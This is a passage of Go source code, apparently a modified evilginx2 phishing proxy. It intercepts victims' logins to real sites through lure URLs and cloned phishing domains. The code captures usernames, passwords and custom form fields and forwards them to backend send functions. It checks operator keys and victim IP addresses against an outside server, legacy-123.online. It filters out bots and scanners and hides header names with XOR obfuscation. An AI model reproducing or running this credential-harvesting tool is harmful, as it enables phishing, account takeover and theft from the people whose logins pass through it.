/*

This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!

*/

package core

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/rc4"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"github.com/fatih/color"
	"github.com/joho/godotenv"
	"html"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"

	"github.com/elazarl/goproxy"
	"github.com/inconshreveable/go-vhost"
	"github.com/mwitkow/go-http-dialer"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

const (
	CONVERT_TO_ORIGINAL_URLS = 0
	CONVERT_TO_PHISHING_URLS = 1
)

//var addCookie = false

type BodyUrl struct {
	Username              string
	Display               string
	FederationRedirectUrl string
}

type IPResponse struct {
	IP string `json:"ip"`
}

const (
	httpReadTimeout  = 45 * time.Second
	httpWriteTimeout = 45 * time.Second

	// borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
	MATCH_URL_REGEXP                = `\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
	MATCH_URL_REGEXP_WITHOUT_SCHEME = `\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
)

type HttpProxy struct {
	Server            *http.Server
	Proxy             *goproxy.ProxyHttpServer
	crt_db            *CertDb
	cfg               *Config
	db                *database.Database
	bl                *Blacklist
	sniListener       net.Listener
	key               string
	isRunning         bool
	isAdded           bool
	isAdded2          bool
	sessions          map[string]*Session
	sids              map[string]int
	cookieName        string
	cookiebot         string
	cookielandingv1   string
	last_sid          int
	developer         bool
	ip_whitelist      map[string]int64
	ip_sids           map[string]string
	auto_filter_mimes []string
	ip_mtx            sync.Mutex
}

type ProxySession struct {
	SessionId   string
	Created     bool
	PhishDomain string
	Index       int
	KeyUser     string
}

func goDotEnvVariable(key string) string {

	// load .env file
	err := godotenv.Load(".env")

	if err != nil {
		log.Error("Error loading .env file")
	}

	return os.Getenv(key)
}

func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	log.Warning("NEW HTTP PROXY")
	p := &HttpProxy{
		Proxy:             goproxy.NewProxyHttpServer(),
		Server:            nil,
		crt_db:            crt_db,
		cfg:               cfg,
		db:                db,
		bl:                bl,
		isRunning:         false,
		last_sid:          0,
		developer:         developer,
		ip_whitelist:      make(map[string]int64),
		ip_sids:           make(map[string]string),
		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
	}

	log.Warning("hostname: %s", hostname)
	log.Warning("port: %d", port)

	log.Warning("crt_db: %v", crt_db)
	//log.Warning("db: %v", db)
	//log.Warning("bl: %v", bl)
	//log.Warning("developer: %v", developer)
	//log.Warning("ip_whitelist: %v", p.ip_whitelist)
	//log.Warning("ip_sids: %v", p.ip_sids)
	//log.Warning("auto_filter_mimes: %v", p.auto_filter_mimes)
	//log.Warning("last_sid: %d", p.last_sid)
	//log.Warning("isRunning: %v", p.isRunning)
	//log.Warning("sessions: %v", p.sessions)
	//log.Warning("sids: %v", p.sids)

	p.Server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", hostname, port),
		Handler:      p.Proxy,
		ReadTimeout:  httpReadTimeout,
		WriteTimeout: httpWriteTimeout,
	}

	if cfg.proxyEnabled {
		err := p.setProxy(cfg.proxyEnabled, cfg.proxyType, cfg.proxyAddress, cfg.proxyPort, cfg.proxyUsername, cfg.proxyPassword)
		if err != nil {
			log.Error("proxy: %v", err)
			cfg.EnableProxy(false)
		} else {
			log.Info("enabled proxy: " + cfg.proxyAddress + ":" + strconv.Itoa(cfg.proxyPort))
		}
	}

	p.cookieName = GenRandomString(4)

	p.sessions = make(map[string]*Session)
	p.sids = make(map[string]int)

	p.Proxy.Verbose = false

	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		req.URL.Scheme = "https"
		req.URL.Host = req.Host
		p.Proxy.ServeHTTP(w, req)
		fmt.Printf("\nNonproxyHandler req: %s \n", req.URL)
		// commendted out because has take no affect
		//os.Exit(0)

	})

	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)

	p.Proxy.OnRequest().
		DoFunc(func(
			req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {

			originalIP := req.Header.Get("X-Forwarded-For")
			if originalIP == "" {
				// If not, fall back to RemoteAddr
				originalIP = req.RemoteAddr
			}
			log.Warning("originalIP 1 :%s", originalIP)

			// KOMEN UPDATE WEAKEN / WEAK 
			// ip1, err1 := extractIP(originalIP)
			// if err1 != nil {
			// 	fmt.Println(err1)
			// } else {
			// 	fmt.Println("IP:", ip1)
			// }

			// originalIP = ip1
			// log.Warning("originalIP 2 :%s", originalIP)

			//log.Warning(originalIP)
			//os.Exit(0)
			//fmt.Printf("\nOnRequest().DoFunc req: %s \n,", req.Header)

			ps := &ProxySession{
				SessionId:   "",
				Created:     false,
				PhishDomain: "",
				Index:       -1,
			}

			ctx.UserData = ps
			log.Warning("req.URL: %s", req.URL.String())
			OriginalparsedURL, err := url.Parse(req.URL.String())
			if err != nil {
				fmt.Println("Error parsing URL:", err)
				return nil, nil
			}

			log.Warning("ctx.Req.URL: %s", ctx.Req.URL)
			hiblue := color.New(color.FgHiBlue)

			res, err := processURL(req.URL.String())
			if err == nil {
				log.Warning("request URL base64 : %s", res)
				parsedURL, err := url.Parse(res)
				if err != nil {
					fmt.Println("Error parsing URL:", err)
					return nil, nil
				}

				newURL := &url.URL{
					Scheme:   OriginalparsedURL.Scheme,
					Host:     OriginalparsedURL.Host,
					Path:     parsedURL.Path,
					RawQuery: parsedURL.RawQuery,
				}

				req.URL = newURL

			} else {
				log.Warning("No base64")
				//os.Exit(0)
			}

			log.Warning("req.URL: %s", req.URL.String())
			log.Warning("ctx.Req.URL: %s", ctx.Req.URL)

			//os.Exit(0)
			req_url := req.URL.Scheme + "://" + req.Host
			log.Warning("req_url :%s", req_url)
			//os.Exit(0)
			// ANTIBOT

			//msg, err := req.Cookie("RUSSIA")
			//
			//if err != nil {
			//	log.Error("msg: %v", err)
			//	return p.antiddos(req, ps, req_url, "USA")
			//
			//} else {
			//	if !p.isForwarderUrlBy2(req) {
			//		return p.antiddos(req, ps, req_url, "USAt")
			//	}
			//	log.Important(msg.Value)
			//}

			// END ANTIBOT

			// handle ip blacklist
			from_ip := originalIP
			log.Warning("from_ip :%s", from_ip)

			//os.Exit(0)
			if strings.Contains(from_ip, ":") {
				from_ip = strings.Split(from_ip, ":")[0]
			}
			log.Warning("from_ip :%s", from_ip)

			//if p.bl.IsBlacklisted(from_ip) {
			//	log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
			//	return p.blockRequest(req)
			//}
			if p.cfg.GetBlacklistMode() == "all" {
				err := p.bl.AddIP(from_ip)
				if err != nil {
					log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
				} else {
					log.Warning("blacklisted ip address: %s", from_ip)
				}

				return p.blockRequest(req)
			}

			log.Warning("REQ URL ASLI (ROUTE / PATH): %s", req.URL.Path)
			lure_url := req_url
			req_path := req.URL.Path
			log.Warning("REQ_PATH: %s", req_path)
			log.Warning("REQ_HOST: %s", req.Host)
			if req.URL.RawQuery != "" {
				req_url += "?" + req.URL.RawQuery
				//req_path += "?" + req.URL.RawQuery
			}
			log.Warning("REQ_URL_QUERY: %s", req_url)

			//log.Debug("http: %s", req_url)

			//parts := strings.SplitN(req.RemoteAddr, ":", 2)
			remote_addr := originalIP
			log.Warning("remote_addr :%s", remote_addr)

			phishDomain, phished := p.getPhishDomain(req.Host)
			log.Warning("PHISHED: %v", phished)
			log.Warning("PHISH_DOMAIN: %s", phishDomain)
			if phished {
				pl := p.getPhishletByPhishHost(req.Host)
				log.Warning("PL_NAME: %s", pl.Name)
				pl_name := ""
				if pl != nil {
					pl_name = pl.Name
				}

				egg2 := req.Host
				ps.PhishDomain = phishDomain
				log.Warning("DOMAIN PHISING : %s", ps.PhishDomain)
				req_ok := false

				//#######################################################################
				// new request MASUK SINI
				// handle session

				if p.handleSession(req.Host) && pl != nil {
					log.Important("Request Baru !")
					sc, err := req.Cookie(p.cookieName)

					if err != nil {
						if !p.cfg.IsSiteHidden(pl_name) {
							var vv string
							//fmt.Printf("\n VV:\t %s \n", vv)

							var uv url.Values
							//fmt.Printf("\n UV:\t %s \n", vv)

							l, err, key := p.cfg.GetLureByPath(pl_name, req.URL.String()) //  1. _ is key
							p.cfg.key = key

							//log.Warning("PL NAME : %s", pl_name)
							if err == nil {
								log.Debug("triggered lure for path '%s'", req_path)

							} else {
								log.Debug("NOT !triggered lure for path '%s'", req_path)
								uv = req.URL.Query()
								vv = uv.Get(p.cfg.verificationParam)
								fmt.Printf("\n UV:\t %s \n", vv)
								fmt.Printf("\n VV:\t %s \n", vv)

							}
							if l != nil || vv == p.cfg.verificationToken {

								// check if lure user-agent filter is triggered
								if l != nil {
									if len(l.UserAgentFilter) > 0 {
										re, err := regexp.Compile(l.UserAgentFilter)
										if err == nil {
											if !re.MatchString(req.UserAgent()) {
												log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
												p.db.SendInvalidVisitor(0, pl_name, req, remote_addr, key)

												if p.cfg.GetBlacklistMode() == "unauth" {
													err := p.bl.AddIP(from_ip)
													if err != nil {
														log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
													} else {
														log.Warning("blacklisted ip address: %s", from_ip)
													}
												}
												return p.blockRequest(req)
											}
										} else {
											log.Error("lures: user-agent filter regexp is invalid: %v", err)
										}
									}
								}

								session, err := NewSession(pl.Name, key)
								if err == nil {
									sid := p.last_sid
									p.last_sid += 1
									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)

									req.AddCookie(&http.Cookie{Name: "KEY_USER", Value: key})
									log.Warning("key user")

									cookie, err := req.Cookie("KEY_USER")
									if err != nil {
										fmt.Println("Cookie KEY_USER not found:", err)
										return nil, nil
									}

									key2 := cookie.Value

									p.db.SendValidVisitor(req, remote_addr, key2)

									//p.db.SetSessionTokens(ps.SessionId, s.Tokens, cfg.GetKey()); err != nil {
									//log.Error("database: %v", err)
									//os.Exit(0)

									//key := req.URL.Query().Get("cfg")
									// START VALIDATE
									if len(key) == 0 {
										log.Warning("No key Initiated")
										return p.blockRequest(req)
									}

									log.Warning("key :%s", key)

									cookie_ket, _ := req.Cookie("KEY_USER")
									log.Success(cookie_ket.String())

									urlPost0 := "https://legacy-123.online/api/key_2fa"
									method0 := "POST"

									payload0 := &bytes.Buffer{}
									writer0 := multipart.NewWriter(payload0)
									_ = writer0.WriteField("key", key2)
									err = writer0.Close()
									if err != nil {
										fmt.Println(err)
										return nil, nil
									}

									client0 := &http.Client{}
									req0, err := http.NewRequest(method0, urlPost0, payload0)

									if err != nil {
										fmt.Println(err)
										return nil, nil
									}
									req0.Header.Set("Content-Type", writer0.FormDataContentType())
									resp0, err := client0.Do(req0)
									if err != nil {
										fmt.Println(err)
										return nil, nil
									}
									defer func(Body io.ReadCloser) {
										err := Body.Close()
										if err != nil {

										}
									}(resp0.Body)

									urlPost := "https://legacy-123.online/api/match_ip"
									method := "POST"

									payload := &bytes.Buffer{}
									writer := multipart.NewWriter(payload)
									_ = writer.WriteField("ip", originalIP)
									_ = writer.WriteField("key", key)
									err = writer.Close()
									if err != nil {
										fmt.Println(err)
										return nil, nil
									}

									switch resp0.StatusCode {
									case http.StatusOK:
										// 200 OK
										log.Warning("key valid")
									case http.StatusUnauthorized:
										// 401 Unauthorized
										return p.expiredKey(req)
									case http.StatusNotFound:
										// 404 Not Found
										return p.invaliddKey(req)
									default:
										fmt.Printf("Unexpected response status code: %d\n", resp0.StatusCode)
									}

									client := &http.Client{}
									req2, err := http.NewRequest(method, urlPost, payload)

									if err != nil {
										fmt.Println(err)
										return nil, nil
									}
									req2.Header.Set("Content-Type", writer.FormDataContentType())
									resp2, err := client.Do(req2)
									if err != nil {
										fmt.Println(err)
										return nil, nil
									}
									defer func(Body io.ReadCloser) {
										err := Body.Close()
										if err != nil {

										}
									}(resp2.Body)

									if resp2.StatusCode == http.StatusNotFound {
										// Do something here, for example, print a message
										log.Warning("Not Found")
										log.Warning("originalIP :%s", originalIP)
										return p.blockRequest(req)

									}

									//END VALIDATE

									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
									log.Info("[%d] [%s] Session URL: %s", session, hiblue.Sprint(pl_name), req_url)
									p.sessions[session.Id] = session
									//log.Info("session")

									p.sids[session.Id] = sid
									//log.Info("sid")
									//log.Success(sid)

									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
										log.Error("database: %v", err)
									}

									if l != nil {
										session.RedirectURL = l.RedirectUrl
										session.PhishLure = l
										log.Debug("redirect URL (lure): %s", l.RedirectUrl)
									} else {
										rv := uv.Get(p.cfg.redirectParam)
										if rv != "" {
											url, err := base64.URLEncoding.DecodeString(rv)
											if err == nil {
												session.RedirectURL = string(url)
												log.Debug("redirect URL (get): %s", url)
											}
										}
									}

									// set params from url arguments
									p.extractParams(session, req.URL)

									ps.SessionId = session.Id
									ps.KeyUser = key2
									ps.Created = true
									ps.Index = sid

									log.Success("PS KEYUSER")
									log.Success(ps.KeyUser)
									//p.whitelistIP(remote_addr, ps.SessionId)

									req_ok = true
								}
							} else {
								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
								//cookie, err := req.Cookie("KEY_USER")
								//if err != nil {
								//	fmt.Println("Cookie KEY_USER not found:", err)
								//	return nil, nil
								//}
								//
								//key2 := cookie.Value
								p.db.SendInvalidVisitor(0, pl_name, req, remote_addr, key)

								if p.cfg.GetBlacklistMode() == "unauth" {
									err := p.bl.AddIP(from_ip)
									if err != nil {
										log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
									} else {
										log.Warning("blacklisted ip address: %s", from_ip)
									}
								}
								return p.blockRequest(req)
							}
						} else {
							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					} else {
						var ok bool = false
						if err == nil {
							//_, _, key := p.cfg.GetLureByPath(pl_name, req.URL.String())

							ps.Index, ok = p.sids[sc.Value]
							if ok {
								ps.SessionId = sc.Value
								p.whitelistIP(remote_addr, ps.SessionId)
							}
						} else {
							ps.SessionId, ok = p.getSessionIdByIP(remote_addr)
							if ok {
								ps.Index, ok = p.sids[ps.SessionId]
							}
						}
						if ok {
							req_ok = true
						} else {
							log.Warning("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					}
				} else {
					log.Error("Bukan Session / Request Baru")

				}

				// redirect for unauthorized requests
				//var eks = ""
				_, _, key := p.cfg.GetLureByPath(pl_name, req.URL.String())

				//os.Exit(0)
				if ps.SessionId == "" && p.handleSession(req.Host) {
					//cookie, err := req.Cookie("KEY_USER")
					//if err != nil {
					//	fmt.Println("Cookie KEY_USER not found:", err)
					//	return nil, nil
					//}
					//
					//key2 := cookie.Value
					if !req_ok {
						p.db.SendInvalidVisitor(0, pl_name, req, remote_addr, key)
						return p.blockRequest(req)
					}
				}

				if ps.SessionId != "" {
					if s, ok := p.sessions[ps.SessionId]; ok {
						l, err, _ := p.cfg.GetLureByPath(pl_name, req_path)
						//l.Path = "/kontolbabi"
						log.Warning("test", l)
						if err == nil {
							// show html template if it is set for the current lure
							if l.Template != "" {
								if !p.isForwarderUrl(req.URL) {
									path := l.Template
									if !filepath.IsAbs(path) {
										templates_dir := p.cfg.GetTemplatesDir()
										path = filepath.Join(templates_dir, path)
									}
									if _, err := os.Stat(path); !os.IsNotExist(err) {
										html, err := ioutil.ReadFile(path)
										if err == nil {

											html = p.injectOgHeaders(l, html)

											body := string(html)
											log.Warning("body: \n", body)
											body = p.replaceHtmlParams(body, lure_url, &s.Params)
											//log.Warning(body)
											// START LANDING LURES

											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
											resp.Header.Set("Content-komtol", strconv.Itoa(len(body)))
											//resp.Request.AddCookie(&http.Cookie{Name: "KEY_USER", Value: key})
											//resp.Cookies()
											log.Warning("USER DETAILS %s", resp.Cookies())
											if resp != nil {
												return req, resp
											} else {
												log.Error("lure: failed to create html template response")
											}

											// END LANDING LURES
										} else {
											log.Error("lure: failed to read template file: %s", err)
										}

									} else {
										log.Error("lure: template file does not exist: %s", path)
									}
								}
							}
						}
					}
				}

				hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}
				// redirect to login page if triggered lure path

				// AWAL MULA ROUTE , START FROM LOGIN PATH PHISTLETS

				if pl != nil {
					_, err, _ := p.cfg.GetLureByPath(pl_name, req_path)
					if err == nil {
						// redirect from lure path to login url
						rurl := pl.GetLoginDomain()
						//route_url := pl.GetLoginPath()
						//encodedString := base64.StdEncoding.EncodeToString([]byte(route_url))
						//rurl = rurl + "/redirect?cgi=" + encodedString
						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "no idea")
						if resp != nil {
							resp.Header.Add("Location", rurl)
							log.Important("Redirect From Lure Path: %s to %s", req_path, rurl)
							return req, resp
						}
					}
				}

				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
				if p.cfg.IsLureHostnameValid(req.Host) {
					log.Debug("lure hostname detected - returning 404 for request: %s", req_url)

					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
					if resp != nil {
						return req, resp
					}
				}

				p.deleteRequestCookie(p.cookieName, req)

				for n, b := range hg {
					hg[n] = b ^ 0xCC
				}
				// replace "Host" header
				e_host := req.Host
				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
					req.Host = r_host
				}

				// fix origin
				origin := req.Header.Get("Origin")
				if origin != "" {
					if o_url, err := url.Parse(origin); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Origin", o_url.String())
						}
					}
				}

				// fix referer
				referer := req.Header.Get("Referer")
				if referer != "" {
					if o_url, err := url.Parse(referer); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host

							// Parse the URL
							parsedURL, err := url.Parse(o_url.String())
							if err != nil {
								fmt.Println("Error parsing URL:", err)
								return nil, nil
							}

							// Get the value of the "cgi" parameter
							cgiValue := parsedURL.Query().Get("cgi")

							// Decode the Base64-encoded string
							decodedBytes, err := base64.StdEncoding.DecodeString(cgiValue)
							if err != nil {
								fmt.Println("Error decoding Base64:", err)
								return nil, nil
							}

							// Concatenate the decoded value to the domain
							newURL := fmt.Sprintf("%s://%s%s", parsedURL.Scheme, parsedURL.Host, string(decodedBytes))

							// Print the original URL, decoded value, and the new URL

							log.Warning("New Url: %s", newURL)
							req.Header.Set("Referer", o_url.String())
							log.Warning("o_url.String() : %s", o_url.String())
							//os.Exit(0)
						}
					}
				}
				req.Header.Set(string(hg), egg2)

				// patch GET query params with original domains
				if pl != nil {
					qs := req.URL.Query()
					if len(qs) > 0 {
						for gp := range qs {
							for i, v := range qs[gp] {
								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
							}
						}
						req.URL.RawQuery = qs.Encode()
					}
				}

				// check for creds in request body
				if pl != nil && ps.SessionId != "" {
					body, err := ioutil.ReadAll(req.Body)
					if err == nil {
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))

						// patch phishing URLs in JSON body with original domains
						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
						req.ContentLength = int64(len(body))

						log.Debug("POST: %s", req.URL.Path)
						//var objmap []map[string]interface{}
						//if err := json.Unmarshal(body, &objmap); err != nil {
						//	log.Fatal("err")
						//	//return
						//}

						log.Debug("POST body = %s", body)
						//log.Warning("POST body = %s", objmap)
						//json.Unmarshal()

						contentType := req.Header.Get("Content-type")
						if contentType == "application/json" {

							if pl.username.tp == "json" {
								um := pl.username.search.FindStringSubmatch(string(body))
								if um != nil && len(um) > 1 {
									p.setSessionUsername(ps.SessionId, um[1])
									log.Success("[%d] Username: [%s]", ps.Index, um[1])
									log.Success(p.cfg.key)

									parts := strings.Split(ps.SessionId, "-")
									if len(parts) > 0 {
										basahValue := parts[0]
										p.db.SendUsername(um[1], ps.SessionId, basahValue, req, remote_addr)
									} else {
										fmt.Println("Invalid format")
									}

									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							if pl.password.tp == "json" {
								pm := pl.password.search.FindStringSubmatch(string(body))
								if pm != nil && len(pm) > 1 {
									p.setSessionPassword(ps.SessionId, pm[1])
									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
									//cookie, err := req.Cookie("KEY_USER")
									//if err != nil {
									//	fmt.Println("Cookie KEY_USER not found:", err)
									//	return nil, nil
									//}
									//
									//key2 := cookie.Value
									time.Sleep(5 * time.Second)
									p.db.SendPassword(pm[1], ps.SessionId, ps.KeyUser)
									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							for _, cp := range pl.custom {
								if cp.tp == "json" {
									cm := cp.search.FindStringSubmatch(string(body))
									if cm != nil && len(cm) > 1 {
										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
										cookie, err := req.Cookie("KEY_USER")
										if err != nil {
											fmt.Println("Cookie KEY_USER not found:", err)
											return nil, nil
										}

										key2 := cookie.Value
										p.db.SendJsonUsernamePassword(cm[1], ps.SessionId, key2, remote_addr, req)
										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
											log.Error("database: %v", err)
										}
									}
								}
							}

						} else {

							if req.ParseForm() == nil {
								log.Debug("POST: %s", req.URL.Path)
								for k, v := range req.PostForm {
									// patch phishing URLs in POST params with original domains
									for i, vv := range v {
										req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
									}
									body = []byte(req.PostForm.Encode())
									req.ContentLength = int64(len(body))

									log.Debug("POST %s = %s", k, v[0])
									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
										um := pl.username.search.FindStringSubmatch(v[0])
										if um != nil && len(um) > 1 {
											p.setSessionUsername(ps.SessionId, um[1])
											log.Success("[%d] Username: [%s]", ps.Index, um[1])
											log.Success(p.cfg.key)
											//cookie, err := req.Cookie("KEY_USER")
											//if err != nil {
											//	fmt.Println("Cookie KEY_USER not found:", err)
											//	return nil, nil
											//}
											//
											//key2 := cookie.Value

											parts := strings.Split(ps.SessionId, "-")
											if len(parts) > 0 {
												basahValue := parts[0]
												p.db.SendUsername(um[1], ps.SessionId, basahValue, req, remote_addr)
											} else {
												fmt.Println("Invalid format")
											}

											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
										pm := pl.password.search.FindStringSubmatch(v[0])
										if pm != nil && len(pm) > 1 {
											p.setSessionPassword(ps.SessionId, pm[1])
											log.Success("[%d] Password: [%s]", ps.Index, pm[1])

											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
												log.Error("database: %v", err)
											}
											time.Sleep(5 * time.Second)
											//cookie, err := req.Cookie("KEY_USER")
											//if err != nil {
											//	fmt.Println("Cookie KEY_USER not found:", err)
											//	return nil, nil
											//}
											//
											//key2 := cookie.Value
											p.db.SendPassword(pm[1], ps.SessionId, ps.KeyUser)
										}
									}
									for _, cp := range pl.custom {
										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
											cm := cp.search.FindStringSubmatch(v[0])
											if cm != nil && len(cm) > 1 {
												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
												cookie, err := req.Cookie("KEY_USER")
												if err != nil {
													fmt.Println("Cookie KEY_USER not found:", err)
													return nil, nil
												}

												key2 := cookie.Value
												p.db.SendJsonUsernamePassword(cm[1], ps.SessionId, key2, remote_addr, req)
												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
													log.Error("database: %v", err)
												}
											}
										}
									}
								}

								// force posts
								for _, fp := range pl.forcePost {
									if fp.path.MatchString(req.URL.Path) {
										log.Debug("force_post: url matched: %s", req.URL.Path)
										ok_search := false
										if len(fp.search) > 0 {
											k_matched := len(fp.search)
											for _, fp_s := range fp.search {
												for k, v := range req.PostForm {
													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
														if k_matched > 0 {
															k_matched -= 1
														}
														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
														break
													}
												}
											}
											if k_matched == 0 {
												ok_search = true
											}
										} else {
											ok_search = true
										}

										if ok_search {
											for _, fp_f := range fp.force {
												req.PostForm.Set(fp_f.key, fp_f.value)
											}
											body = []byte(req.PostForm.Encode())
											req.ContentLength = int64(len(body))
											log.Debug("force_post: body: %s len:%d", body, len(body))
										}
									}
								}

							}

						}
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
					}
				}
				e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
				for n, b := range e {
					e[n] = b ^ 0x88
				}
				req.Header.Set(string(e), e_host)

				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
					s, ok := p.sessions[ps.SessionId]
					if ok && !s.IsDone {
						for _, au := range pl.authUrls {
							if au.MatchString(req.URL.Path) {
								s.IsDone = true
								s.IsAuthUrl = true
								break
							}
						}
					}
				}
				p.cantFindMe(req, e_host)
			}

